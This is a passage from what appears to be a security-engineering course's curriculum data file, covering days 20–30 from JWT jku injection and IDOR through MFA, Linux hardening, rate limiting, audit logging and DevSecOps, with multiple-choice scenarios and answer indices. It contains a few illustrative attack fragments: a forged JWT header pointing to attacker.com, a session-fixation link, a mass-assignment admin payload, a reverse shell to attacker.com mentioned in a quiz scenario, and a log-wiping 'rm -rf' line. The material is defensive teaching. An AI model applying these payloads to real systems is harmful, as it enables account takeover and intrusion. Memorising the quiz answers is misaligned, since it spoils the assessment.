      scenario: "An API gateway verifies JWTs by fetching the JWKS from `https://auth.enterprise.com/.well-known/jwks.json`. An attacker sends a JWT with a header `{\"jku\": \"https://attacker.com/jwks.json\", \"kid\": \"key1\"}`. The gateway fetches the attacker's JWKS and accepts the token as valid. What catastrophic design flaw occurred?",
      options: [
        "The attacker brute-forced the RSA 4096-bit key.",
        "Unvalidated JWKS URL (jku) Injection Trap: The gateway blindly fetched the signing keys from the URL specified by the untrusted token header (`jku`) rather than using a hardcoded, trusted internal configuration URL.",
        "The gateway ran out of socket connections.",
        "JSON Web Keys only work over HTTP."
      ],
      answerIdx: 1,
      debrief: "Tokens must never dictate where verification keys are fetched. Gateways must strictly ignore `jku` headers from untrusted tokens and fetch public keys exclusively from configured, trusted identity provider endpoints."
    },
    quests: [
      { id: "sec-m1-d20-q1", name: "Milestone 4 Architecture: Enterprise Identity & Token Federation", type: "concept", desc: "Architect an OAuth 2.1 / OIDC authorization server with JWKS rotation, PKCE enforcement, and scope claims." },
      { id: "sec-m1-d20-q2", name: "Detective Lab: Auditing JWKS Spoofing & Key ID (kid) SQL Injection", type: "detective", desc: "Audit a token verification engine vulnerable to header injection and path traversal in the kid parameter." },
      { id: "sec-m1-d20-q3", name: "Mastery Assignment: Production Identity Gateway with JWKS Rotation & PKCE Engine", type: "assignment", desc: "Build a TypeScript identity gateway issuing and verifying RS256 tokens with dynamic JWKS caching and PKCE validation." },
      { id: "sec-m1-d20-q4", name: "Production Incident Lab: Unauthorized API Access via Forged Token Audience Triage", type: "detective", desc: "Triage a production security alert where an attacker exploited a missing audience validation check across microservices." }
    ]
  },

  // ─── BLOCK 5: Access Control, Session Security & Host Hardening (Days 21–25) ────
  {
    day: 21,
    month: 1,
    blockNum: 5,
    title: "Broken Object Level Authorization (BOLA / IDOR): Scoped UUIDs, ABAC & Ownership Proofs",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Data-Tier Access Control Invariants)",
    spokenGoal: "Eliminate OWASP API #1 vulnerability — Broken Object Level Authorization (BOLA / IDOR): understand why checking user authentication is completely distinct from checking resource ownership, move beyond naive sequential IDs to cryptographically scoped UUIDs, and enforce Attribute-Based Access Control (ABAC) in the database query layer.",
    conceptInvariant: "Ownership Binding Invariant: Every data access query must bind the requested resource ID to the authenticated tenant/user context at the database query level (`WHERE resource_id = $1 AND owner_id = $2`). Authorizing in the controller after fetching by raw ID is an anti-pattern that creates race conditions and authorization leaks.",
    failureMode: "Fetching records via `SELECT * FROM orders WHERE id = :orderId` and returning them without verifying that `order.userId === currentUser.id`, allowing an authenticated customer to increment the order ID and view every other customer's private purchases.",
    tryItFriction: "Refactor an API route that retrieves customer medical records: eliminate the IDOR vulnerability by enforcing an ABAC ownership policy that validates tenant ID and role permissions directly inside the database query.",
    socraticHints: [
      "Why isn't checking `req.user.isAuthenticated` enough before returning `/api/invoices/:id`?",
      "Because being logged in does not mean you own THAT specific invoice!",
      "Bind the query: `SELECT * FROM invoices WHERE id = $1 AND organization_id = $2`."
    ],
    situationalPuzzle: {
      scenario: "An engineer replaces auto-incrementing integer IDs (`/documents/1042`) with UUIDv4 strings (`/documents/a8098c1a-...`) to 'fix' IDOR vulnerabilities. A penetration tester obtains a valid document UUID through a shared link and accesses sensitive financial records belonging to another department. Why did UUIDs fail to stop the authorization bypass?",
      options: [
        "UUIDs can be cracked using rainbow tables.",
        "Security through Obscurity Fallacy: UUIDs make IDs unguessable, but unguessability is NOT authorization. If an attacker learns a UUID (via logs, referers, or sharing), the backend still serves the document because it lacks an explicit ownership/permission check.",
        "Postgres cannot index UUID columns efficiently.",
        "UUIDv4 contains predictable timestamp sequences."
      ],
      answerIdx: 1,
      debrief: "Unguessable identifiers (UUIDs) prevent automated sequential scraping, but they are not an authorization control. Every request must still verify whether the authenticated principal possesses the explicit privilege or ownership to access the resource."
    },
    quests: [
      { id: "sec-m1-d21-q1", name: "RBAC vs ABAC vs ReBAC Authorization Models", type: "concept", desc: "Compare Role-Based (RBAC), Attribute-Based (ABAC), and Relationship-Based (ReBAC / Zanzibar) access models." },
      { id: "sec-m1-d21-q2", name: "Detective Lab: Exploiting BOLA in GraphQL Nested Resolvers", type: "detective", desc: "Identify an IDOR vulnerability in a GraphQL query where nested child resolvers bypass top-level parent authorization checks." },
      { id: "sec-m1-d21-q3", name: "Mastery Assignment: Attribute-Based Access Control Query Interceptor", type: "assignment", desc: "Build a TypeScript database query interceptor that injects tenant context and ownership invariants into all SQL queries." },
      { id: "sec-m1-d21-q4", name: "Production Incident Lab: Unauthorized Mass Invoice Scraping Forensics", type: "detective", desc: "Triage a production security breach where a competitor scraped private enterprise pricing contracts via an unprotected BOLA endpoint." }
    ]
  },
  {
    day: 22,
    month: 1,
    blockNum: 5,
    title: "Session Lifecycle Management: Absolute vs Inactivity Timeouts & Session Fixation",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Session State Machine Invariants)",
    spokenGoal: "Engineer resilient session lifecycles: understand Session Fixation attacks, enforce cryptographic session regeneration upon privilege transitions (login/logout), differentiate between sliding inactivity timeouts and hard absolute expiration, and implement concurrent session limits.",
    conceptInvariant: "Privilege Transition Regeneration Invariant: The session identifier must be cryptographically destroyed and replaced with a fresh identifier upon ANY transition in privilege level (anonymous -> authenticated, user -> admin, password change). Retaining the same session ID across authentication allows session fixation exploits.",
    failureMode: "Failing to regenerate the session cookie upon login: an attacker creates an anonymous session, sends the victim a link with the session ID (`?session_id=attacker_session`), and after the victim logs in, the attacker uses the same session ID to access the victim's account.",
    tryItFriction: "Build a session manager in TypeScript that implements sliding idle timeouts (15 minutes), hard absolute ceilings (8 hours), session regeneration on login, and Redis-backed concurrent session revocation.",
    socraticHints: [
      "Why must a session expire after a fixed absolute time even if the user is actively typing?",
      "To bound the exposure window if a session token is secretly exfiltrated by an attacker or left open on a shared terminal!",
      "Track `createdAt` and `lastActivityAt`: expire if `now - lastActivityAt > 15m` OR if `now - createdAt > 8h`."
    ],
    situationalPuzzle: {
      scenario: "A banking application implements a 'Remember Me' feature. An employee logs in from a cybercafe, checks their balance, and leaves. Two days later, another customer opens the browser and finds the employee's bank account still fully accessible. What session management invariant was violated?",
      options: [
        "The computer had an unpatched BIOS.",
        "Missing Absolute Session Ceilings & Device Binding: The application issued an unbounded persistent session without verifying device fingerprints, IP subnet stability, or enforcing absolute session expiration boundaries.",
        "The bank server failed to clear its RAM.",
        "Cookies do not support HTTPS on shared networks."
      ],
      answerIdx: 1,
      debrief: "High-security applications must enforce strict absolute timeouts, bind sessions to device attributes, and invalidate persistent cookies on high-risk privilege actions (funds transfers) by requiring step-up re-authentication."
    },
    quests: [
      { id: "sec-m1-d22-q1", name: "Session State Machine: Creation, Idle, Absolute & Revocation", type: "concept", desc: "Design a state transition diagram modeling active, idle-expired, absolute-expired, and administratively-revoked sessions." },
      { id: "sec-m1-d22-q2", name: "Detective Lab: Executing and Defending against Session Fixation", type: "detective", desc: "Simulate a session fixation attack in a mock application and verify that session regeneration blocks the exploit." },
      { id: "sec-m1-d22-q3", name: "Mastery Assignment: Distributed Redis Session Engine with Dual Timeouts", type: "assignment", desc: "Implement a TypeScript session manager backed by Redis tracking idle windows, absolute limits, and concurrent session caps." },
      { id: "sec-m1-d22-q4", name: "Production Incident Lab: Zombie Session Triage after Corporate Password Reset", type: "detective", desc: "Investigate an incident where an employee's revoked sessions remained active across mobile devices after a forced password reset." }
    ]
  },
  {
    day: 23,
    month: 1,
    blockNum: 5,
    title: "Multi-Factor Authentication: RFC 6238 TOTP (HMAC-SHA1, 30s Drift) & FIDO2 / WebAuthn",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Time-Based One-Time Passwords & Hardware Tokens)",
    spokenGoal: "Implement enterprise Multi-Factor Authentication (MFA): explore Time-Based One-Time Passwords (TOTP / RFC 6238), understand time-step counter math ($T = \\lfloor (\\text{time} - T_0) / X \\rfloor$) and clock drift tolerance windows, and analyze why phishing-resistant FIDO2 / WebAuthn hardware keys supersede SMS and TOTP.",
    conceptInvariant: "Anti-Replay & Time-Window Invariant: A TOTP token (6-digit code) is valid strictly within its designated 30-second time-step window ($X=30$). Once a code has been successfully verified, it must be recorded in an anti-replay cache (in Redis) and immediately rejected if presented again within the same time window to defeat token replay attacks.",
    failureMode: "Validating TOTP codes without tracking redeemed tokens: an attacker eavesdrops or phishes a 6-digit code and quickly replays it to authenticate a second session before the 30-second window expires.",
    tryItFriction: "Implement an RFC 6238 TOTP generator and validator in TypeScript using HMAC-SHA1 and dynamic truncation, with a $\\pm 1$ time-step clock drift allowance and a Redis anti-replay lock.",
    socraticHints: [
      "Why do TOTP authenticators allow checking $T-1$ and $T+1$ time steps?",
      "To accommodate small clock differences between the user's phone and the server time!",
      "Allow $T \\pm 1$ but immediately store the used code in Redis with TTL=90s so it cannot be re-used."
    ],
    situationalPuzzle: {
      scenario: "An enterprise mandates 6-digit TOTP MFA for all employees. An adversary sets up an Evilginx reverse-proxy phishing site that proxies the login page in real-time. An employee enters their password and their 6-digit TOTP code. The attacker intercepts the code and logs into the employee's account within 5 seconds. Why did TOTP fail to stop this phishing attack?",
      options: [
        "The employee's phone clock was 5 minutes fast.",
        "MFA Phishing Relay Vulnerability: TOTP codes are not origin-bound. A real-time reverse proxy can relay the user's valid password and TOTP code to the legitimate backend immediately. Only FIDO2 / WebAuthn hardware keys defeat this attack because WebAuthn cryptographically binds the challenge to the browser's exact origin URL.",
        "RFC 6238 has been cryptographically cracked.",
        "Evilginx cracked the user's master TOTP seed."
      ],
      answerIdx: 1,
      debrief: "SMS and TOTP codes are vulnerable to real-time proxy phishing. FIDO2 / WebAuthn is the gold standard because the browser and hardware authenticator sign the challenge using the website's exact origin domain, making phishing proxies cryptographically impossible."
    },
    quests: [
      { id: "sec-m1-d23-q1", name: "RFC 6238 TOTP Mathematical Specification & Dynamic Truncation", type: "concept", desc: "Trace HMAC computation, dynamic truncation offsets, binary masking, and modulo extraction." },
      { id: "sec-m1-d23-q2", name: "Detective Lab: Auditing Phishing Relay Vulnerabilities in MFA Flows", type: "detective", desc: "Analyze how reverse-proxy frameworks relay credential and TOTP tokens, and demonstrate WebAuthn cryptographic protection." },
      { id: "sec-m1-d23-q3", name: "Mastery Assignment: RFC 6238 TOTP Engine with Drift Windows & Anti-Replay Cache", type: "assignment", desc: "Implement a TypeScript TOTP engine with base32 secret decoding, drift compensation, and Redis single-use enforcement." },
      { id: "sec-m1-d23-q4", name: "Production Incident Lab: Executive Account Takeover via MFA Fatigue / Replay", type: "detective", desc: "Investigate an MFA fatigue and prompt-bombing security incident that compromised an internal engineering portal." }
    ]
  },
  {
    day: 24,
    month: 1,
    blockNum: 5,
    title: "Linux OS Hardening: PAM, Disabling Root SSH, Linux Capabilities & iptables/nftables",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Operating System Hardening & Network Packet Filtering)",
    spokenGoal: "Harden Linux servers to CIS Benchmark standards: configure Pluggable Authentication Modules (PAM), disable root SSH logins and password authentication, drop unnecessary Linux kernel capabilities (`setuid`, `net_admin`), and construct stateful firewall packet filters using `nftables`.",
    conceptInvariant: "Least Privilege Execution Invariant: Production services must NEVER run as root (`UID 0`). Strip all root capabilities using `setpriv` or container security contexts. Services must only possess the exact microscopic Linux capabilities required for execution (`CAP_NET_BIND_SERVICE`), preventing privilege escalation if the process is compromised.",
    failureMode: "Running a Node.js web server as root because it needs to bind to port 80/443: an attacker exploits an RCE bug in a library and immediately gains root access to the host kernel and filesystem.",
    tryItFriction: "Write a server hardening script that configures `/etc/ssh/sshd_config` (Ed25519 keys only, MaxAuthTries 3), sets up `nftables` stateful connection tracking, and runs applications under an unprivileged user with dropped capabilities.",
    socraticHints: [
      "How can a non-root application bind to port 80 without running as root?",
      "By granting only the specific Linux capability: `setcap 'cap_net_bind_service=+ep' /usr/bin/node`!",
      "Never run as UID 0; drop all capabilities and grant only what is needed."
    ],
    situationalPuzzle: {
      scenario: "A server administrator configures an `iptables` firewall to allow outbound connections with `iptables -A OUTPUT -j ACCEPT`. An attacker gains a low-privileged shell on the server and sets up a reverse shell that connects outbound to `attacker.com:443`. Why did the firewall allow the reverse shell to escape?",
      options: [
        "Port 443 is unencrypted by default.",
        "Unrestricted Egress Trap: The firewall permitted all outbound traffic indiscriminately. Proper egress hardening requires restricting outbound traffic to explicitly whitelisted IP ranges and DNS domains, blocking arbitrary reverse shells.",
        "Linux iptables does not support TCP connections.",
        "The reverse shell used IPv6."
      ],
      answerIdx: 1,
      debrief: "Default-allow egress firewalls make reverse shells trivial for attackers. Hardened enterprise servers enforce strict outbound firewall rules (default DROP on OUTPUT) allowing connections only to specific internal repos, database clusters, and approved API endpoints."
    },
    quests: [
      { id: "sec-m1-d24-q1", name: "Linux Security Architecture: PAM, Capabilities & Namespaces", type: "concept", desc: "Map PAM authentication stacks (/etc/pam.d), kernel capabilities, and process security boundaries." },
      { id: "sec-m1-d24-q2", name: "Detective Lab: Auditing SUID Binaries & Privilege Escalation Vectors", type: "detective", desc: "Scan a Linux host for misconfigured SUID binaries and insecure capability permissions that allow root escalation." },
      { id: "sec-m1-d24-q3", name: "Mastery Assignment: CIS Benchmark Automated Server Hardening Engine", type: "assignment", desc: "Build a TypeScript automation script that audits SSH configs, file permissions, and generates stateful nftables rule sets." },
      { id: "sec-m1-d24-q4", name: "Production Incident Lab: Containment of Infiltrated Linux Web Node", type: "detective", desc: "Isolate a compromised production Linux node, preserve memory forensics, and sever attacker reverse shells." }
    ]
  },
  {
    day: 25,
    month: 1,
    blockNum: 5,
    title: "⭐ MILESTONE 5: Zero-Trust Session & Multi-Factor Access Proxy with RFC 6238 Drift Engine",
    stageName: "Stage 3: Systems Stress-Testing",
    stageNum: 3,
    pedagogicalRole: "High Cognitive Friction (Milestone Gate: Session & MFA Access Proxy)",
    spokenGoal: "Assemble Milestone 5: Engineer a Zero-Trust Session & Multi-Factor Access Proxy combining RFC 6238 TOTP verification, sliding/absolute session lifecycle state machines, cryptographic session regeneration, and ABAC database ownership gates.",
    conceptInvariant: "Zero-Trust Enforcement Invariant: Authenticating once at the perimeter is insufficient. The Access Proxy must continuously verify session health on every request, enforce step-up MFA for privileged operations, and enforce resource ownership checks before routing traffic to backend microservices.",
    failureMode: "Enforcing MFA at initial login but allowing sensitive administrative actions (e.g. changing banking payout details or adding SSH keys) without step-up authentication, allowing an attacker with a stolen session cookie to take over the account.",
    tryItFriction: "Complete Milestone 5 by constructing a reverse proxy in TypeScript that evaluates incoming session cookies, enforces step-up TOTP verification for protected routes, and drops unauthorized traffic.",
    socraticHints: [
      "What is step-up authentication?",
      "Requiring the user to re-enter their MFA code or password before performing high-risk actions, even if they already have an active session!",
      "Tag session state with `mfaVerifiedAt` and require that `now - mfaVerifiedAt < 5m` for destructive operations."
    ],
    situationalPuzzle: {
      scenario: "An enterprise access proxy enforces MFA and verifies session cookies. An attacker hijacks an authenticated user's session cookie. However, when the attacker attempts to use the cookie from their own laptop, the proxy immediately terminates the session and triggers a security alert. How did the proxy detect the theft?",
      options: [
        "The attacker's laptop ran out of battery.",
        "Device Context & TLS Client Fingerprinting: The proxy bound the session not only to the cookie, but also to a cryptographic hash of the client's TLS JA3/JA4 fingerprint, user-agent entropy, and IP subnet, detecting the abrupt hardware context mismatch.",
        "Session cookies are physically tied to computer monitors.",
        "The proxy used satellite GPS tracking."
      ],
      answerIdx: 1,
      debrief: "Modern zero-trust proxies bind sessions to client context (JA3/JA4 TLS fingerprints, network locality, device posture). A stolen cookie used from a different browser or network immediately fails the fingerprint match, neutralizing the stolen credential."
    },
    quests: [
      { id: "sec-m1-d25-q1", name: "Milestone 5 Architecture: Zero-Trust Access Proxy Topology", type: "concept", desc: "Design a high-throughput authentication proxy enforcing continuous verification and step-up MFA." },
      { id: "sec-m1-d25-q2", name: "Detective Lab: Auditing Session Hijacking Defenses via Context Binding", type: "detective", desc: "Test an access proxy by replaying cookies across divergent IP addresses and TLS client configurations." },
      { id: "sec-m1-d25-q3", name: "Mastery Assignment: Production Zero-Trust MFA Access Proxy Gateway", type: "assignment", desc: "Build a TypeScript reverse proxy implementing RFC 6238 TOTP validation, Redis session state machines, and ABAC routing." },
      { id: "sec-m1-d25-q4", name: "Production Incident Lab: Session Hijack Triage & Automated Quarantine", type: "detective", desc: "Triage a live security alert where an employee's session was replayed from an anonymous TOR exit node." }
    ]
  },

  // ─── BLOCK 6: API Security, Auditing & Capstone Viva (Days 26–30) ───────────────
  {
    day: 26,
    month: 1,
    blockNum: 6,
    title: "Mass Assignment & Parameter Tampering: DTO Whitelisting, Type Coercion & Immutability",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Data Binding & Model Protection)",
    spokenGoal: "Eliminate Mass Assignment (OWASP API #3): understand how automatic object binding in web frameworks (Spring, Rails, Express, NestJS) allows attackers to tamper with internal object fields (e.g., `isAdmin: true`, `balance: 999999`), and enforce strict Data Transfer Object (DTO) whitelisting.",
    conceptInvariant: "Explicit Ingestion Invariant: An application must never bind raw HTTP request bodies directly to database entity models (`User.update(req.body)`). Every incoming request must be parsed through a strictly typed DTO that whitelists permitted fields and explicitly ignores or rejects unknown properties.",
    failureMode: "Executing `user.update(req.body)` on a user profile update endpoint, allowing an attacker to submit `{\"name\": \"Bob\", \"role\": \"admin\", \"isVerified\": true}` and elevate their account to full administrative privileges.",
    tryItFriction: "Write a type-safe input binding validator in TypeScript using Zod / class-validator that strips undeclared properties, enforces strict schema types, and rejects unexpected administrative keys.",
    socraticHints: [
      "Why is `Object.assign(user, req.body)` a critical vulnerability?",
      "Because an attacker can pass ANY property that exists on the database model, overriding security-critical flags!",
      "Use explicit DTO picking: `const { name, bio } = req.body; user.update({ name, bio });`."
    ],
    situationalPuzzle: {
      scenario: "A developer builds an e-commerce checkout API. A customer sends `POST /checkout` with `{\"itemId\": 42, \"quantity\": 1, \"price\": 0.01}`. The backend uses the request body to calculate the invoice, and the customer purchases a $1,000 laptop for 1 cent. What architectural flaw permitted this?",
      options: [
        "The database crashed during checkout.",
        "Client-Side Price Trust / Parameter Tampering: The backend trusted client-supplied financial state (price) rather than querying the authoritative price directly from the database catalog during transaction processing.",
        "The credit card processor had a bug.",
        "The API needed to use GraphQL instead of REST."
      ],
      answerIdx: 1,
      debrief: "Client input must strictly be treated as intent, never authoritative state. Critical business attributes (prices, balances, roles, permissions) must be retrieved exclusively from secure backend datastores, never accepted from request parameters."
    },
    quests: [
      { id: "sec-m1-d26-q1", name: "Automatic Object Mapping & Prototype Pollution Mechanics", type: "concept", desc: "Analyze how recursive object merging can overwrite prototype chains and database model properties." },
      { id: "sec-m1-d26-q2", name: "Detective Lab: Exploiting Mass Assignment in Registration Endpoints", type: "detective", desc: "Audit an onboarding API and construct an exploit payload elevating a new account to superuser via hidden DTO fields." },
      { id: "sec-m1-d26-q3", name: "Mastery Assignment: Immutable DTO Schema Validator & Stripping Engine", type: "assignment", desc: "Implement a TypeScript validation pipeline that enforces strict schema whitelisting and strips unauthorized properties." },
      { id: "sec-m1-d26-q4", name: "Production Incident Lab: Unauthorized Admin Role Elevation Triage", type: "detective", desc: "Investigate an incident where an attacker granted themselves admin privileges via a profile settings API endpoint." }
    ]
  },
  {
    day: 27,
    month: 1,
    blockNum: 6,
    title: "Rate Limiting & DoS Defense: Token Bucket, Sliding Window Counters & Distributed Bursts",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Traffic Shaping & DoS Mitigation)",
    spokenGoal: "Shield APIs against Denial of Service (DoS) and credential stuffing attacks: compare Token Bucket, Leaky Bucket, and Sliding Window Counter rate-limiting algorithms, implement distributed rate-limiting in Redis with Lua scripts, and engineer adaptive burst throttles.",
    conceptInvariant: "Atomic Window Invariant: In a distributed system, rate-limiting counters must be evaluated and incremented atomically. Naive read-then-write operations (`GET count -> if count < limit -> SET count + 1`) suffer from race conditions under heavy load that allow attackers to exceed the rate limit by 1000x.",
    failureMode: "Implementing rate limiting with a fixed-window counter (`resets every minute on the clock`), allowing an attacker to send 100 requests at 11:59:59 and another 100 requests at 12:00:00, bursting 200 requests within 1 second and crashing the database.",
    tryItFriction: "Write an atomic Sliding Window Log rate limiter in TypeScript using Redis sorted sets (ZSET) that accurately bounds requests over any rolling 60-second period regardless of boundary edges.",
    socraticHints: [
      "Why do fixed-window rate limiters fail at window boundaries?",
      "Because an attacker can double the burst limit by firing requests across the boundary seconds!",
      "Use Redis ZSETs: remove elements older than `now - window`, count remaining, and add current timestamp if within limit."
    ],
    situationalPuzzle: {
      scenario: "A fintech login endpoint limits attempts to 5 per minute per IP address. An adversary launches a distributed credential stuffing attack against 50,000 user accounts using a residential proxy botnet with 100,000 distinct IP addresses. The IP rate limiter blocks 0 requests. What architectural enhancement is required?",
      options: [
        "Increase the server CPU count.",
        "Multi-Dimensional Rate Limiting: IP-only rate limiting fails against botnets. The system must enforce multi-dimensional rate limits simultaneously: per-IP, per-targeted-username, and global endpoint velocity, coupled with proof-of-work challenges (Cloudflare Turnstile).",
        "Block all internet traffic.",
        "Switch from Redis to Memcached."
      ],
      answerIdx: 1,
      debrief: "Modern attackers use rotating residential proxies to bypass IP-based rate limiting. Production defense requires multi-dimensional rate limiting that tracks velocity per account target and applies global anomaly throttling."
    },
    quests: [
      { id: "sec-m1-d27-q1", name: "Rate Limiting Algorithms: Token Bucket vs Sliding Window Logs", type: "concept", desc: "Compare time and memory complexity of Token Bucket, Leaky Bucket, Fixed Window, and Sliding Window ZSETs." },
      { id: "sec-m1-d27-q2", name: "Detective Lab: Auditing Race Conditions in Distributed Counter Implementations", type: "detective", desc: "Benchmark concurrent requests against a non-atomic Redis counter and demonstrate rate limit bypass under load." },
      { id: "sec-m1-d27-q3", name: "Mastery Assignment: Atomic Redis Sliding-Window Rate Limiter Middleware", type: "assignment", desc: "Implement a production TypeScript rate limiter using Redis Lua scripts returning standard RFC 6585 headers (Retry-After)." },
      { id: "sec-m1-d27-q4", name: "Production Incident Lab: Credential Stuffing Botnet Mitigation War Room", type: "detective", desc: "Mitigate an ongoing distributed botnet credential stuffing attack on an authentication cluster without impacting valid users." }
    ]
  },
  {
    day: 28,
    month: 1,
    blockNum: 6,
    title: "Security Logging & Auditing: Tamper-Evident Append-Only Logs, PII Masking & Syslog RFC 5424",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Audit Trails & Cryptographic Integrity)",
    spokenGoal: "Build forensic-grade security audit logging: implement RFC 5424 structured logging, enforce automated PII masking (passwords, credit cards, tokens), and design tamper-evident append-only audit trails using cryptographic hash chains (Merkle trees / blockchain-style log blocks).",
    conceptInvariant: "Audit Tamper-Evidence Invariant: Security audit logs must be immutable and tamper-evident. If an adversary compromises a server, they must not be able to delete or modify previous audit records without breaking the cryptographic hash chain ($H_i = \\text{SHA256}(H_{i-1} \\parallel \\text{Record}_i)$) or altering remote write-once log streams (WORM).",
    failureMode: "Logging unredacted HTTP headers in application logs: an attacker's bearer token or a user's raw password appears in plain text in log search tools, accessible to every developer and customer support representative.",
    tryItFriction: "Build a structured security logging pipeline in TypeScript that automatically redacts sensitive fields (passwords, auth headers, SSNs) and chains log entries together using SHA-256 hashes.",
    socraticHints: [
      "Why is a simple local log file insufficient for security investigations?",
      "Because the first thing an attacker does after gaining root access is `rm -rf /var/log/*` to erase their tracks!",
      "Stream logs in real-time over TLS to a remote, write-only log collector (Syslog/WORM) with cryptographic hash chains."
    ],
    situationalPuzzle: {
      scenario: "During a security audit, compliance officers discover that an attacker gained admin access 6 months ago and altered database billing records. When investigators check the database audit table, all log entries from that month show normal activity. How did the attacker cover their tracks, and what would have prevented it?",
      options: [
        "The database ran out of disk space.",
        "Mutable In-Database Log Trap: The audit logs were stored in standard mutable database tables where an admin can execute `UPDATE audit_logs SET ...` or `DELETE`. Logs should have been streamed to a cryptographically chained append-only WORM datastore (Amazon S3 Object Lock / Sigstore Rekor).",
        "The operating system time was incorrect.",
        "Postgres does not support log indexing."
      ],
      answerIdx: 1,
      debrief: "Storing audit logs in the same database they are auditing is a critical compliance flaw. Audit records must be immutable, forward-secure, and stored in a remote write-once, read-many (WORM) storage system."
    },
    quests: [
      { id: "sec-m1-d28-q1", name: "Syslog RFC 5424 Architecture & Cryptographic Hash Chaining", type: "concept", desc: "Detail structured logging fields, facility/severity codes, and forward-secure hash chaining." },
      { id: "sec-m1-d28-q2", name: "Detective Lab: Auditing Log Injection & PII Leakage in Log Aggregators", type: "detective", desc: "Identify CRLF log injection vulnerabilities where unescaped carriage returns allow attackers to forge log lines." },
      { id: "sec-m1-d28-q3", name: "Mastery Assignment: Tamper-Evident Security Audit Logger with PII Masking", type: "assignment", desc: "Build a TypeScript logger with automated regex PII masking and SHA-256 cryptographic chaining between records." },
      { id: "sec-m1-d28-q4", name: "Production Incident Lab: Post-Breach Log Tampering Forensic Reconstruction", type: "detective", desc: "Reconstruct an attacker's timeline of actions after they attempted to truncate local server log files." }
    ]
  },
  {
    day: 29,
    month: 1,
    blockNum: 6,
    title: "Automated Vulnerability Scanning & DevSecOps: SAST, DAST, Semgrep & Pre-Commit Security",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (DevSecOps CI/CD Automation & Shift-Left Security)",
    spokenGoal: "Shift security left into the engineering workflow: construct automated DevSecOps pipelines integrating Static Application Security Testing (SAST via Semgrep), Dynamic Application Security Testing (DAST via OWASP ZAP), Software Composition Analysis (SCA), and pre-commit secret scanning hooks.",
    conceptInvariant: "Shift-Left Automated Gate Invariant: Security defects must be caught during the developer's pull request phase before code is merged. Any secret (API key, private key) or high-severity SAST vulnerability detected in a commit must immediately fail the CI/CD pipeline and block deployment.",
    failureMode: "Accidentally committing an AWS root API secret key to a public GitHub repository in a late-night commit, resulting in automated botnet crawlers hijacking the cloud account and spinning up crypto miners within 90 seconds.",
    tryItFriction: "Author custom Semgrep rules that detect insecure SQL string concatenation and unencrypted password handling in TypeScript code, and integrate them into a GitHub Actions CI workflow.",
    socraticHints: [
      "Why are post-deployment penetration tests insufficient by themselves?",
      "Because discovering a vulnerability weeks after deployment means the flaw was live in production the entire time!",
      "Automate security checks on every pull request using SAST, secret scanners (Gitleaks), and dependency checkers."
    ],
    situationalPuzzle: {
      scenario: "A developer accidentally commits an AWS access key to a GitHub branch. Within 1 minute, they realize the mistake, run `git rm`, commit the removal, and push to main. 2 hours later, the cloud team discovers 50 unauthorized EC2 instances running crypto miners. Why did removing the secret in the next commit fail to protect the key?",
      options: [
        "GitHub automatically sends all commits to AWS.",
        "Git History Immutability Trap: Git commits are immutable snapshots. Removing a file in a new commit leaves the secret intact in previous git history objects. Automated scrapers monitor public GitHub commits in real-time and extract keys within seconds.",
        "The developer's laptop was hacked.",
        "AWS keys cannot be removed."
      ],
      answerIdx: 1,
      debrief: "Once a secret is committed to a git repository, it must be considered permanently compromised. Pushing a follow-up commit does not erase git history. The key must be immediately revoked and rotated, and pre-commit hooks (Gitleaks) must be installed to prevent pushes before they occur."
    },
    quests: [
      { id: "sec-m1-d29-q1", name: "DevSecOps Pipeline Architecture: SAST vs DAST vs SCA", type: "concept", desc: "Compare AST pattern matching (Semgrep), dynamic HTTP fuzzing (ZAP), and dependency vulnerability databases." },
      { id: "sec-m1-d29-q2", name: "Detective Lab: Authoring Custom Semgrep Security Rules for AST Detection", type: "detective", desc: "Write Semgrep YAML rules detecting insecure crypto algorithms (`md5`, `sha1`), unescaped innerHTML, and missing CSRF tokens." },
      { id: "sec-m1-d29-q3", name: "Mastery Assignment: Automated Pre-Commit & CI Security Pipeline Enforcer", type: "assignment", desc: "Implement a TypeScript CI test suite that scans codebase changes for exposed secrets and insecure AST patterns." },
      { id: "sec-m1-d29-q4", name: "Production Incident Lab: Emergency Secret Revocation & Infiltration Containment", type: "detective", desc: "Execute an emergency cloud credential invalidation and assess infrastructure audit logs after an API key leak." }
    ]
  },
  {
    day: 30,
    month: 1,
    blockNum: 6,
    title: "⭐ CAPSTONE 1: CyberShield Enterprise Defense Gateway (Month 1 Capstone Viva Gate)",
    stageName: "Stage 4: Architectural Autonomy",
    stageNum: 4,
    pedagogicalRole: "Zero Support (Month 1 Capstone Viva Gate: Autonomous Security Platform)",
    spokenGoal: "Deliver Month 1 Capstone: Defend the CyberShield Enterprise Defense Gateway — a production-grade secure reverse proxy uniting AST WAF inspection, TLS 1.3 termination, OAuth 2.1 PKCE verification, AES-256-GCM envelope encryption, RFC 6238 TOTP verification, and tamper-evident audit logging before a panel of Senior Security Architects.",
    conceptInvariant: "Unified Defense Invariant: A hardened enterprise system is only as strong as its weakest link. CyberShield proves that input validation, transport security, cryptographic key management, identity federation, and auditability function as a cohesive, resilient defense grid capable of repelling OWASP Top 10 exploits under high-throughput load.",
    failureMode: "Presenting a defense gateway where individual security filters operate in isolation without unified correlation, allowing an attacker to bypass rate limiting via encoded WAF payloads or exploit race conditions in session validation.",
    tryItFriction: "Complete the Month 1 Capstone by integrating all Month 1 components into a standalone, executable reverse-proxy service that successfully defends against automated red-team attack scripts while maintaining sub-10ms latency.",
    socraticHints: [
      "How do the components of CyberShield interact during a request lifecycle?",
      "1. TLS 1.3 terminates -> 2. Rate limiter checks IP/token -> 3. WAF inspects normalized AST -> 4. JWT/OAuth validates identity -> 5. ABAC verifies ownership -> 6. Audit log records result.",
      "Defend every architectural decision, cipher selection, and threat boundary during the live viva examination."
    ],
    situationalPuzzle: {
